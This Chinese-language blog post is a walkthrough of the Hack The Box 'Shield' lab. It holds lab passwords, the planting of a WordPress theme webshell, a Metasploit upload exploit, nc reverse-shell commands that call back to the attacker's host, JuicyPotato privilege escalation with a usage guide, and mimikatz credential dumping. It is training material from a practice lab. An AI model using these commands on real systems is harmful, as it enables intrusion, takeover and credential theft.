<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Hackthebox-Shield - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>Hackthebox-Shield</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
<div class="container text-center mt-3">
    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
</div>
</div>
<div class="meta">
  <div>2020-12-07 22:17</div>
  <div>
    <span><a href="https://getshe11.com/tags/hackthebox/">#hackthebox</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01-前言">0x01 前言</h1>
<p>根据hackthebox的惯性，我在这里收集了前面的所有密码：</p>
<ul>
<li>
<p>Archetype：</p>
<p>Mssql:M3g4c0rp123</p>
<p>Administrator:MEGACORP_4dm1n!!</p>
</li>
<li>
<p>Oopsie</p>
<p>Mysql:M3g3C0rpUs3r!</p>
<p>ftp:mc@F1l3ZilL4</p>
</li>
<li>
<p>Vaccine</p>
<p>Zip:741852963</p>
<p>Web:qwerty789</p>
<p>postgres:P@s5w0rd!</p>
</li>
</ul>
<h1 id="0x02-过程">0x02 过程</h1>
<h2 id="信息收集">信息收集</h2>
<!-- raw HTML omitted -->
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/1.png" alt="1"></p>
<h2 id="getshell">Getshell</h2>
<p>看到只有两个端口：80、3306，3306我尝试了连接，发现不给外链，那入口就应该在80端口，打开是一个iis默认的页面</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/2.png" alt="2"></p>
<p>开dirbuster进行目录扫描，发现是一个wordpress程序：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/3.png" alt="3"></p>
<p>看到是wp中间散发了挺多思路的，首先是使用wpscan进行插件、主题漏洞扫描，之后是枚举用户密码。</p>
<p>后来发现wp的版本是大于5.0的，很多漏洞都不能利用了，尝试密码大法最终使用**P@s5w0rd!**成功登陆了后台：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/4.png" alt="4"></p>
<p>编辑主题：http://10.10.10.29/wordpress/wp-admin/theme-editor.php?file=search.php&amp;theme=twentysixteen</p>
<p>修改了search.php的内容为我们的冰蝎php马：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/5.png" alt="5"></p>
<p>一句话地址：http://10.10.10.29/wordpress/wp-content/themes/twentysixteen/search.php</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/6.png" alt="6"></p>
<p>用冰蝎命令执行没有交互式，有交互式的虚拟终端太卡了。还是上msf吧：</p>
<pre><code>msf &gt; use exploit/unix/webapp/wp_admin_shell_upload
msf &gt; set PASSWORD P@s5w0rd!
msf &gt; set USERNAME admin
msf &gt; set TARGETURI /wordpress
msf &gt; set RHOSTS 10.10.10.29
msf &gt; run
</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/7.png" alt="7"></p>
<p>使用msf的shell还是不好用，毕竟是根据webshell来建立连接的：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/8.png" alt="8"></p>
<p>还是直接上nc，使用刚才在冰蝎上传的nc.exe:</p>
<p><code>execute -f nc.exe -a &quot;-e cmd.exe 10.10.14.33 1234&quot;</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/9.png" alt="9"></p>
<h2 id="提权">提权</h2>
<p>win2016以上估计也就只有烂土豆了，上传了一个，但不是webshell版本的，使用官方的方法，写入一个bat文件，内容为：</p>
<p><code>START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.2 1111</code></p>
<p>在反弹shell上面执行</p>
<p><code>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.2 1111 &gt; shell.bat</code></p>
<p>监听端口：</p>
<p><code>nc -lvp 1111</code></p>
<p>执行烂土豆：</p>
<p><code>JuicyPotato.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/10.png" alt="10"></p>
<p>官方说要把JuicyPotato.exe改名能躲过Windows Defender查杀，实验中不改名也可以正常使用。</p>
<p>后面就是获取用户的密码步骤了</p>
<p>上传mimikatz</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">./mimikatz.exe
sekurlsa::logonpasswords
</code></pre></div><p>获得用Sandra的密码， 估计这个密码在下面的靶机中也能用到</p>
<p>后面尝试了，为什么在webshell执行烂土豆的时候会失败，是因为没有加上CLSID参数，默认的是会出现COM -&gt; recv failed with error: 10038失败的。</p>
<p>因为靶机是2016所以在https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard</p>
<p>找到2016的clsid就可以了。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Shield/11.png" alt="11"></p>
<h1 id="0x03-总结">0x03 总结</h1>
<p>1、看到80端口必定有很大概率是从web入手的，一般扫一下目录就可以了。</p>
<p>2、这次web用的是wp，一开始就先尝试密码会省下很多时间。</p>
<p>3、烂土豆 （JuicyPotato）</p>
<p>使用方法：</p>
<p><strong>(1)查看当前用户权限，是否符合要求</strong></p>
<p><code>whoami /priv</code></p>
<p>如果开启SeImpersonate权限，juicypotato的参数可以使用<code>-t t</code></p>
<p>如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用<code>-t u</code></p>
<p>如果均开启，可以选择<code>-t *</code></p>
<p>如果均未开启，那么无法提权</p>
<p><strong>(2)查看RPC默认端口是否为135</strong></p>
<p>如果被修改(例如为111)，juicypotato的参数可以使用<code>-n 111</code></p>
<p>如果系统禁用了RPC，并不是一定无法提权，需要满足如下条件：</p>
<p>找到另一系统，能够以当前用户的权限进行远程RPC登录，此时juicypotato的参数可以使用<code>-k &lt;ip&gt;</code></p>
<p>例如Win7、WIn8系统，默认配置下，允许135端口的入站规则即可进行远程RPC登录</p>
<p>添加防火墙规则允许135端口入站的命令如下：</p>
<p><code>netsh advfirewall firewall add rule name=&quot;135&quot; protocol=TCP dir=in localport=135 action=allow</code></p>
<p>也可以选择将防火墙关闭，可参考绕过UAC关闭防火墙的代码：</p>
<p><a href="https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/DisableFirewall.cpp">https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/DisableFirewall.cpp</a></p>
<p><strong>(3)根据操作系统选择可用的CLSID</strong></p>
<p>参考列表 <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p>
<p>例如测试系统Server2012，选择CLSID为<code>{8BC3F05E-D86B-11D0-A075-00C04FB68820}</code></p>
<p><strong>(4)选择一个系统未占用的端口作为监听端口</strong></p>
<p>例如，最终参数如下：</p>
<p><code>JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}</code></p>
<p>表示开启SeImpersonate权限创建进程，监听端口1111，使用的CLSID为<code>{8BC3F05E-D86B-11D0-A075-00C04FB68820}</code></p>
<ul>
<li>CLSID ：https://github.com/ohpe/juicy-potato/tree/master/CLSID</li>
<li>Windows本地提权工具Juicy-Potato测试分析 <a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/</a></li>
<li>Potato家族本地提权分析 <a href="https://www.sec-in.com/article/583">https://www.sec-in.com/article/583</a></li>
<li>记一次Windows渗透提权历程 <a href="https://xz.aliyun.com/t/5899">https://xz.aliyun.com/t/5899</a></li>
<li>Potato家族本地提权细节 <a href="https://xz.aliyun.com/t/7776">https://xz.aliyun.com/t/7776</a></li>
</ul>
<p>4、rlwrap</p>
<p>它是一个用于反弹shell的时候，我们通常按上下会出现乱码，使用这个辅助工具就可以正常使用上下减号等操作：</p>
<p>kali安装：</p>
<p><code>apt install rlwarp</code></p>
<p>其他系统可以参照：https://github.com/hanslub42/rlwrap</p>
<p>使用方法：</p>
<p><code>rlwarp nc -lvnp 1234</code></p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e8%bf%87%e7%a8%8b">
                            0x02 过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86">
                            信息收集
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#getshell">
                            Getshell
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%8f%90%e6%9d%83">
                            提权
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e6%80%bb%e7%bb%93">
                            0x03 总结
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
